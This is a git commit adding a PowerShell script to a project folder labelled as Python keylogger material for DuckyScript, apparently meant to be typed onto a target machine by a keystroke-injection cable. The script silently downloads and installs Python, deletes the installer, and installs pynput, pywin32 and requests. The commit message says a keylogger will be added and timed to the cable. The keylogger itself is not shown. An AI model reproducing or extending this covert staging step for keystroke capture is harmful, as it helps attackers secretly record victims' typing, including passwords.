eaf9be44c7074bba9164acede22da61e75ada376
csandoval63 <csandoval63@student.rcc.edu>
2020-05-13 21:55:46 -0700

    Add files via upload
    python installer, will add python keylogger here and make necessary changes to it match timing with cable

---
+++ Python keylogger stuff with DUCKYscript/install_python.ps1
@@ -0,0 +1,7 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "python-3.8.0.exe"
+.\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
+Start-Sleep -s 40
+$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+Remove-Item .\python-3.8.0.exe
+invoke-expression 'cmd /c start powershell -Command { $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"); python -m pip install --upgrade pip; pip install wheel; pip install pynput; pip install pywin32; pip install requests; pip install easygui }'
